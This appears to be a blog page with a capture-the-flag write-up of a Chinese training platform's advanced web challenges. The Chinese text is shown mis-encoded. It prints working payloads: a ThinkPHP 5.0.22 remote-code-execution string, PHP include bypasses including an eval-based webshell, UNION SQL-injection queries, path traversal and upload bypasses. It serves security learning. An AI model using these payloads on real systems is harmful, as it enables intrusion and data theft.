<!DOCTYPE html>


<html lang="en">


<head>
  <meta name="baidu-site-verification" content="code-3rVA1ADdSj" />
  <meta charset="utf-8" />
   
  <meta name="keywords" content="Hexo,ayer,ä»£ç ,åšå®¢" />
   
  <meta name="description" content="welcome to Sung&#39;s Blog" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº |  Sung&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?80b2f48cd548787f831c320e7eb27d4c";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="Sung's Blog" type="application/atom+xml">
</head>
</html>
</html>

<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº
</h1>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-date">
  <time datetime="2021-08-09T16:00:00.000Z" itemprop="datePublished">2021-08-10</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> Word count:</span>
            <span class="post-count">4.3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> Reading timeâ‰ˆ</span>
            <span class="post-count">20 min</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"><a href="#æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº" class="headerlink" title="æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"></a>æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æ”»é˜²ä¸–ç•Œè¿›é˜¶åŒºï¼Œé¢˜é‡å¤šï¼Œæ…¢æ…¢è€ã€‚</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>ç¬¬ä¸€ä¸ªé¡µé¢æ˜¯index.phpï¼Œæ¯ä¸ªç½‘ç«™éƒ½æœ‰ï¼Œæœ¬é¢˜ä¼šè·³è½¬åˆ°1.phpï¼Œæ‰€ä»¥æŠ“åŒ…å³å¯å¾—åˆ°</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210809233134941.png" alt="image-20210809233134941"></p>
<h3 id="Training-www-Robots"><a href="#Training-www-Robots" class="headerlink" title="Training-www-Robots"></a>Training-www-Robots</h3><p>æ ¹æ®æç¤ºè®¿é—®robots.txtï¼Œçœ‹åˆ°å¦‚ä¸‹é¡µé¢ï¼Œè®¿é—®/f10g.phpå³å¯å¾—åˆ°flagã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141706915.png" alt="image-20210812141706915"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141749360.png" alt="image-20210812141749360"></p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>æ ¹æ®æç¤ºè¿™é“é¢˜æ˜¯php rceæ¼æ´ï¼Œthinkphp5.0.22ç‰ˆæœ¬ï¼Œè¿™ä¸ªæ˜¯å·²ç»æŠ«éœ²çš„æ¼æ´ï¼Œæ‰¾åˆ°å®ƒçš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812160017327.png" alt="image-20210812160017327"></p>
<p><code>payload:/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p>
<p><code>vars[1][]</code>åé¢è·Ÿçš„æ˜¯ä»»æ„æ‰§è¡Œçš„å‘½ä»¤è¡Œ<code>cat /flag</code>ï¼Œå¯ä»¥å…ˆ<code>find / -name flag</code>æ‰¾åˆ°flagæ–‡ä»¶<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812182303546.png" alt="image-20210812182303546"></p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>ä»£ç è¿‡æ»¤äº†<code>php://</code>åè®®ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨å¤§å†™çš„<code>PHP://</code>æ¥ç»•è¿‡ï¼Œåˆ©ç”¨pageå‚æ•°çš„payload:</p>
<ol>
<li>PHP://inputï¼Œç„¶åPOST <code>&lt;?php phpinfo();?&gt;</code></li>
<li><code>?page=data://text/plain,&lt;?php%20system(&#39;ls&#39;)?&gt;</code></li>
<li><code>?page=data://text/plain,&lt;?php%20@eval $_POST[&#39;sung&#39;];?&gt;</code>ï¼Œantswordè¿æ¥</li>
</ol>
<p>å¯¹äºhelloå‚æ•°çš„ç”¨æ³•æ›´ç®€å•ï¼Œç›´æ¥<code>?hello=&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
<p>çœ‹wpè¿˜æœ‰ä¸€ç§ç›´æ¥ç™»å½•phpadminç„¶ååœ¨æ•°æ®åº“å†™é©¬ï¼Œantswordè¿æ¥ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812194901568.png" alt="image-20210812194901568"></p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>æš´åŠ›ç ´è§£ï¼ŒburpæŠ“åŒ…å‘åˆ°intuderæ¨¡å—ï¼Œå¯¹idå‚æ•°æ•´æ•°çˆ†ç ´ï¼Œid=2333å¾—åˆ°çš„å“åº”é•¿åº¦ä¸åŒï¼ŒæŸ¥çœ‹flagã€‚</p>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>è¿›å»åªæœ‰ä¸€å¼ è¡¨æƒ…åŒ…ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ³¨é‡Šé‡Œå†™ç€<code>source.php</code>ï¼Œç”¨burpæ‰«æç›®å½•ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816084257141.png" alt="image-20210816084257141"></p>
<p>æˆ‘ä»¬å¾—åˆ°äº†æºç ï¼Œä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//æ•°ç»„ï¼šç´¢å¼•=&gt;å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                       <span class="comment">//æˆªå–ä¸€æ®µå­—ç¬¦ä¸²</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)           <span class="comment">//è¿”å›?çš„ä½ç½®</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);                <span class="comment">//urlè§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;       <span class="comment">//æˆªåˆ°source.phpæˆ–è€…hint.php</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) )</span><br><span class="line">    &#123;                                               <span class="comment">//fileå­—ç¬¦ä¸²è¦é€šè¿‡checkfileéªŒè¯</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©<code>file</code>å‚æ•°ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶ç»•è¿‡checkFileå‡½æ•°éªŒè¯ï¼Œæ„é€ <code>payload:?file=hint.php?</code>ï¼Œé€šè¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­return trueã€‚ä¸€äº›wpå¯¹<code>?</code>è¿›è¡Œä¸¤æ¬¡urlç¼–ç æ˜¯ä¸ºäº†é€šè¿‡ç¬¬äºŒä¸ªifã€‚</p>
<p>å¦‚ä½•è¿ç”¨includeå»å¾—åˆ°æˆ‘ä»¬çš„flagï¼Ÿ</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816112901649.png" alt="image-20210816112901649"></p>
<p>includeçš„å¯»æ‰¾é¡ºåºï¼š</p>
<ol>
<li>å…ˆæŒ‰å‚æ•°ç»™å‡ºçš„è·¯å¾„å¯»æ‰¾ï¼Œç»™å‡ºç»å¯¹è·¯å¾„ï¼ˆ<code>/</code>å¼€å¤´ï¼‰æˆ–è€…ç›¸å¯¹è·¯å¾„ï¼ˆ<code>./</code>æˆ–è€…<code>../</code>ï¼‰</li>
<li>æ²¡æœ‰ç»™å‡ºè·¯å¾„åˆ™æŒ‰ç…§<code>include_path</code>è§„å®šçš„ç›®å½•å¯»æ‰¾</li>
<li>å†æ‰¾ä¸åˆ°å°±åœ¨æ–‡ä»¶æ‰€åœ¨ç›®å½•æˆ–è€…å½“å‰ç›®å½•ä¸‹å¯»æ‰¾ã€‚</li>
</ol>
<p>æ‰€ä»¥payload:<code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816142146352.png" alt="image-20210816142146352"></p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„sqlæ³¨å…¥ã€‚</p>
<p>åˆ¤æ–­å…¶å­—æ®µæ•°ï¼š<code>&#39; and 1=0 union select 1,2,3#</code>ã€‚æˆåŠŸå›æ˜¾</p>
<p>åˆ¤æ–­å½“å‰æ•°æ®åº“åä»¥åŠç‰ˆæœ¬ï¼š<code>&#39; and 1=0 union select 1,database(),version()#</code>ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816080824462.png" alt="image-20210816080824462"></p>
<p>è·å¾—æ‰€æœ‰çš„è¡¨åï¼š<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816081723926.png" alt="image-20210816081723926"></p>
<p>æŸ¥è¯¢<code>news</code>æ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082336320.png" alt="image-20210816082336320"></p>
<p>æŸ¥çœ‹<code>secret_table</code>è¡¨ä¸­çš„åˆ—ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot;#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082311624.png" alt="image-20210816082311624"></p>
<p>æŸ¥çœ‹<code>fl4g</code>ä¸­çš„ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(fl4g) from news.secret_table#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082430767.png" alt="image-20210816082430767"></p>
<p><code>flag: QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
<h3 id="NaNa"><a href="#NaNa" class="headerlink" title="NaNa"></a>NaNa</h3><p>é™„ä»¶ä¸‹è½½åçš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	_=<span class="string">&#x27;function$()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;	[0]);.splice(0,1)&#125;&#125;&#125;	\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;	write(s[o%4]buttonif(e.ment&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27;	&#x27;</span>)</span><br><span class="line">		<span class="keyword">with</span>(_.split($[Y]))  _=join(pop());</span><br><span class="line">	<span class="built_in">eval</span>(_)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æœ‰å¾ˆå¤šçº¢ç‚¹æ²¡æ³•æ˜¾ç¤ºï¼Œæ˜¯å› ä¸ºç¼–ç çš„é—®é¢˜ï¼Œä¸è¿‡æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚</p>
<p>ä»£ç æ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<ol>
<li><p><code>_</code>å˜é‡èµ‹å€¼ä¸€ä¸ªå­—ç¬¦ä¸²</p>
</li>
<li><p><code>for</code>å¾ªç¯ï¼Œ<code>Y</code>å˜é‡å–ä¸€ä¸ªå¥‡æ€ªçš„å­—ç¬¦</p>
</li>
<li><p>å¾ªç¯å†…éƒ¨ï¼Œ<code>with</code>è¯­å¥ç›¸å½“äº<code>_=_.split($[Y]).join(_.split($[Y]).pop())</code></p>
</li>
<li><p>æœ€å<code>eval</code>å‡½æ•°æ‰§è¡Œå¤„ç†ä¹‹åçš„å­—ç¬¦ä¸²ã€‚</p>
</li>
</ol>
<p>å› ä¸ºjavascriptæ²¡æœ‰è¾“å‡ºè¯­å¥ï¼Œæˆ‘ä»¬å°†evalç›´æ¥æ”¹æˆ<code>alert(_)</code>æˆ–è€…<code>document.write(_)</code>ç­‰</p>
<p>å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                            s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ»¡è¶³<code>if</code>è¿™äº›æ¡ä»¶ï¼Œé‚£å°±è®¡ç®—å¾—åˆ°<code>flag</code>ï¼Œç›´æ¥å°†<code>if</code>è¯­å¥çš„è®¡ç®—å¼ç²˜è´´åˆ°æ§åˆ¶å°ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210901225754630.png" alt="image-20210901225754630"></p>
<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>è¿›å»ä¹‹åå•¥ä¹Ÿæ²¡çœ‹åˆ°ï¼Œhint: Can you anthenticate to this website?ï¼ŒéªŒè¯èº«ä»½ï¼Œç”¨burpæ·»åŠ ç›®å½•å­—å…¸æ‰«æï¼Œå‘ç°äº†<code>index.phps</code>éå¸¸å¥‡æ€ªçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®å¾—åˆ°äº†æºä»£ç ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815182807625.png" alt="image-20210815182807625"></p>
<p>æºç å¦‚ä¸‹</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183226544.png" alt="image-20210815183226544"></p>
<p>æ‰€ä»¥å°±æ˜¯idå‚æ•°è¦ç­‰äºurlç¼–ç çš„adminï¼Œæ‰€ä»¥payloadç­‰äº<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code>ã€‚æ³¨æ„æµè§ˆå™¨æœ¬èº«ä¼šå¯¹urlè¿›è¡Œè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183551331.png" alt="image-20210815183551331"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183847894.png" alt="image-20210815183847894"></p>
<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p>ä¹‹å‰å·²ç»äº†è§£è¿‡ååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œç›¸æ¯”è¾ƒHNUçš„ååºåˆ—åŒ–ï¼Œè¿™é“å¾ˆç®€å•äº†ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„æ˜¯<code>_wakeup()</code>å‡½æ•°ï¼Œåªéœ€è¦å°†æˆå‘˜æ•°ä»1æ”¹æˆ2å°±è¡Œäº†</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150334273.png" alt="image-20210816150334273"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150727147.png" alt="image-20210816150727147"></p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>ä¸Šä¼ æ–‡ä»¶æ¼æ´ï¼Œé€‰æ‹©ä¸€ä¸ªphpæ–‡ä»¶å‘ç°è¿ä¸Šä¼ éƒ½ä¸Šä¼ ä¸äº†ï¼Œå‰ç«¯é™åˆ¶äº†ä¸Šä¼ æ–¹å¼ï¼Œå…¶å®å¯ä»¥ç›´æ¥åˆ é™¤disabledå±æ€§æäº¤ã€‚</p>
<p>ä½†æ˜¯ä¸ºäº†å­¦ä¹ ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816162642338.png" alt="image-20210816162642338"></p>
<p>å°±æ˜¯ä½¿ç”¨check()å‡½æ•°å»æ£€æŸ¥æ˜¯å¦å¯ä»¥ä¸Šä¼ ï¼Œ<code>name.replace(/^.+\./, &#39;&#39;)</code>è¡¨ç¤ºå°†<code>.</code>ä¹‹å‰çš„æ–‡ä»¶åæ›¿æ¢ä¸ºç©º</p>
<p><code>arr[].contaings(ext)</code>å¦‚æœæ£€æŸ¥åˆ°æ•°ç»„åŒ…å«extå…ƒç´ ï¼Œåˆ™è¿”å›trueã€‚</p>
<p>æ‰€ä»¥æ–¹æ³•æœ‰ï¼š</p>
<ol>
<li>F12åˆ é™¤disabledï¼Œå³å¯ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190351845.png" alt="image-20210816190351845"></li>
<li>å…ˆä¸Šä¼ jpgæ–‡ä»¶ï¼ŒburpæŠ“åŒ…ç„¶åä¿®æ”¹æ–‡ä»¶åç¼€åã€‚</li>
</ol>
